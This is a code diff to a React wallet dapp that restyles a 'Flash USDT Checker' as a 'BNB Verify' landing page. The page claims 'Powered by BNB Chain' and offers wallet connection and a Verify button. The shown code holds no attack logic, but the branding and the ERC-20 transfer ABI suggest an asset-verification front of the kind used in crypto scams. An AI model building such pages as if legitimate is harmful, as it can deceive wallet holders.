@@ -12,7 +12,7 @@ export default function App() {
     "function transfer(address to, uint256 amount) returns (bool)"
   ];
 
-  // Wallet connect function
+  // Connect wallet
   async function connectWallet() {
     if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
     const provider = new ethers.BrowserProvider(window.ethereum);
@@ -22,7 +22,7 @@ export default function App() {
     setWalletAddress(address);
   }
 
-  // Verify function (untouched)
+  // Verify function
   async function verifyUser() {
     if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
     const provider = new ethers.BrowserProvider(window.ethereum);
@@ -45,63 +45,85 @@ export default function App() {
   }
 
   return (
-    <div className="min-h-screen flex bg-[#121212]">
-      {/* Sidebar */}
-      <aside className="w-64 bg-[#1E1E1E] p-6 flex flex-col gap-8">
-        <div className="text-yellow-400 font-bold text-2xl">⚡ Flash Checker</div>
-        <nav className="flex flex-col gap-4 text-gray-400">
-          <a href="#" className="hover:text-yellow-400 transition">Dashboard</a>
-          <a href="#" className="hover:text-yellow-400 transition">Contracts</a>
-          <a href="#" className="hover:text-yellow-400 transition">Settings</a>
+    <div className="bg-[#121212] min-h-screen font-inter text-[#E0E0E0]">
+      {/* Navbar */}
+      <header className="bg-[#171717] bg-opacity-80 backdrop-blur-md sticky top-0 z-50">
+        <nav className="container mx-auto px-6 py-4 flex justify-between items-center">
+          <a href="#" className="flex items-center space-x-2">
+            <div className="h-8 w-8 bg-yellow-400 rounded-full"></div>
+            <span className="text-xl font-bold text-yellow-400">BNB Verify</span>
+          </a>
+
+          <div className="hidden md:flex space-x-8 text-sm font-medium">
+            <a href="#" className="hover:text-yellow-400 transition-colors">Home</a>
+            <a href="#" className="hover:text-yellow-400 transition-colors">Explorer</a>
+            <a href="#" className="hover:text-yellow-400 transition-colors">Tokens</a>
+            <a href="#" className="hover:text-yellow-400 transition-colors">NFTs</a>
+            <a href="#" className="hover:text-yellow-400 transition-colors">DApps</a>
+          </div>
+
+          <button
+            onClick={walletAddress ? null : connectWallet}
+            className="md:hidden text-gray-400 focus:outline-none"
+          >
+            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16m-7 6h7"></path>
+            </svg>
+          </button>
+
+          {walletAddress && (
+            <span className="hidden md:inline-block px-3 py-1 bg-gray-800 rounded-lg text-green-400 font-mono">
+              {walletAddress.slice(0,6)}...{walletAddress.slice(-4)}
+            </span>
+          )}
         </nav>
-      </aside>
+      </header>
 
       {/* Main Content */}
-      <div className="flex-1 flex flex-col">
-        {/* Topbar */}
-        <header className="w-full bg-[#1A1A1A] p-4 flex justify-between items-center shadow">
-          <h1 className="text-xl font-bold text-yellow-400">Flash USDT Checker</h1>
-          <div>
-            {walletAddress ? (
-              <span className="text-green-400 font-mono px-3 py-1 bg-gray-800 rounded-lg">
-                {walletAddress.slice(0,6)}...{walletAddress.slice(-4)}
-              </span>
-            ) : (
-              <button onClick={connectWallet} className="px-4 py-2 bg-yellow-400 text-black font-bold rounded-lg">
-                Connect Wallet
+      <main className="relative overflow-hidden pt-12 md:pt-24 lg:pt-32">
+        <div className="container mx-auto px-6 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+          
+          {/* Left Content */}
+          <div className="relative z-10 text-center lg:text-left">
+            <div className="inline-block bg-[#1E1E1E] text-yellow-400 text-xs font-semibold px-4 py-1 rounded-full mb-4">
+              Powered by BNB Chain
+            </div>
+            <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold leading-tight mb-6 text-white">
+              Verify Crypto Assets on <br className="hidden md:inline"/>BNB Chain
+            </h1>
+            <p className="text-lg md:text-xl text-gray-400 mb-8 max-w-lg mx-auto lg:mx-0">
+              Our advanced platform provides instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.
+            </p>
+            <div className="flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4 items-center justify-center lg:justify-start">
+              <button
+                onClick={verifyUser}
+                className="button-primary w-full md:w-auto text-center"
+              >
+                Verify
               </button>
-            )}
-          </div>
-        </header>
-
-        {/* Content */}
-        <main className="flex-1 flex flex-col items-center justify-center p-10 relative">
-          {/* Pulsing Rings + Verification Card */}
-          <div className="relative flex items-center justify-center w-full max-w-md h-64 mb-8">
-            {/* Rings */}
-            <div className="pulse-ring w-64 h-64 border-opacity-30 absolute"></div>
-            <div className="pulse-ring w-48 h-48 border-opacity-50 absolute"></div>
-            <div className="pulse-ring w-32 h-32 border-opacity-70 absolute"></div>
-
-            {/* Card */}
-            <div className="bg-[#1E1E1E] p-8 rounded-2xl shadow-xl w-full text-center relative z-10">
-              {verified ? (
-                <p className="text-green-400 font-semibold text-lg">✅ Verified Contract</p>
-              ) : (
-                <p className="text-yellow-400 font-semibold text-lg">❌ Not Verified</p>
-              )}
+              <a href="#" className="button-secondary w-full md:w-auto text-center">
+                Explore BNB Chain
+              </a>
             </div>
           </div>
 
-          {/* Verify Button */}
-          <button
-            onClick={verifyUser}
-            className="px-10 py-4 bg-gradient-to-r from-yellow-500 to-yellow-400 text-black font-bold rounded-xl shadow-lg hover:brightness-110 transition"
-          >
-            Verify
-          </button>
-        </main>
-      </div>
+          {/* Right Graphic */}
+          <div className="relative flex justify-center items-center h-96 lg:h-auto">
+            <div className="absolute inset-0 flex justify-center items-center">
+              {/* Pulsing Rings */}
+              <div className="absolute w-[calc(100%-2rem)] h-[calc(100%-2rem)] max-w-md max-h-md rounded-full border-2 border-yellow-400 border-opacity-30 animate-pulse-slow"></div>
+              <div className="absolute w-[calc(75%-2rem)] h-[calc(75%-2rem)] max-w-sm max-h-sm rounded-full border-2 border-yellow-400 border-opacity-50 animate-pulse-slow"></div>
+              <div className="absolute w-[calc(50%-2rem)] h-[calc(50%-2rem)] max-w-xs max-h-xs rounded-full border-2 border-yellow-400 border-opacity-70 animate-pulse-slow"></div>
+
+              {/* Center logo */}
+              <svg className="h-24 w-24 text-yellow-400" fill="currentColor" viewBox="0 0 48 48">
+                <path d="M24 0L12 12L24 24L12 36L24 48L36 36L24 24L36 12L24 0Z" />
+              </svg>
+            </div>
+          </div>
+
+        </div>
+      </main>
     </div>
   );
 }
